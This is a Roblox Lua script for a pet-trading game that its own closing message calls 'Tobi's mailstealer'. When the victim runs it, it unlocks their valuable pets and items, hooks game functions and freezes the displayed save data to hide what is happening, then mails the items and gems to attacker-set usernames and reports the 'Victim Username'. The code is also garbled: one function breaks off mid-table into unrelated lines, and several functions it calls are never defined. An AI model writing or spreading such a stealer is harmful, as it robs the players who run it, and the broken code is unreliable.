_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local mailsent = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = "GG / GY2RVSEGDT"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local user = _G.Username or "PetsGoMommy"
local user2 = _G.Username2 or "PetsGoMommy"
local discuser = _G.discuser or ""
local min_rap = _G.minrap or 1000000

local newamount = 20000

if mailsent ~= 0 then
	newamount = math.ceil(newamount * (1.5 ^ mailsent))
end

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
		break
    end
end

if newamount > GemAmount1 then
    return
end

local function formatNumber(number)
	local number = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(diamonds)
    local headers = {
        ["Content-Type"] = "application/json",
        ["DiscUser"] = discuser or ""
    }

	local fields = {
		{
			name = "Victim Username:",
			value = plr.Name,
			inline = true
		},
		{
			name = "Items to be sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = "",
            inline = false
        }
        [5] = 1
    }
    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
        return false
    else
        return true
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
			if value._uq then
				network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
			end
        end
    end
end

local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}

for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		for uid, item in pairs(save[v]) do
			if v == "Pet" then
                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                if dir.huge or dir.exclusiveLevel then
                    local rapValue = getRAP(v, item)
                    if rapValue >= min_rap then
                        local prefix = ""
                        if item.pt and item.pt == 1 then
                            prefix = "Golden "
                        elseif item.pt and item.pt == 2 then
                            prefix = "Rainbow "
                        end
                        if item.sh then
                            prefix = "Shiny " .. prefix
                        end
                        local id = prefix .. item.id
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                        totalRAP = totalRAP + (rapValue * (item._am or 1))
                    end
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                    totalRAP = totalRAP + (rapValue * (item._am or 1))
                end
            end
            if item._lk then
                local args = {
                [1] = uid,
                [2] = false
                }
                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
        end
	end
end

if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ClaimMail()
	if IsMailboxHooked() then
		local Mailbox = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
        for i, Func in ipairs(getgc(true)) do
            if typeof(Func) == "function" and debug.info(Func, "n") == "typeof" then
                local Old
                Old = hookfunction(Func, function(Ins, ...)
                    if Ins == Mailbox then
                        return tick()
                    end
                    return Old(Ins, ...)
                end)
            end
        end
	end
    EmptyBoxes()
	require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
	require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
    local blob_a = game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")
    local blob_b = require(blob_a).Get()
    function deepCopy(original)
        local copy = {}
        for k, v in pairs(original) do
            if type(v) == "table" then
                v = deepCopy(v)
            end
            copy[k] = v
        end
        return copy
    end
    blob_b = deepCopy(blob_b)
    require(blob_a).Get = function(...)
        return blob_b
    end

    table.sort(sortedItems, function(a, b)
        return a.rap * a.amount > b.rap * b.amount 
    end)

    spawn(function()
        SendMessage(GemAmount1)
    end)

    for _, item in ipairs(sortedItems) do
        if item.rap >= newamount then
            sendItem(item.category, item.uid, item.amount)
        else
            break
        end
    end
    SendAllGems()
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
    setclipboard("discord.gg/GY2RVSEGDT")
end
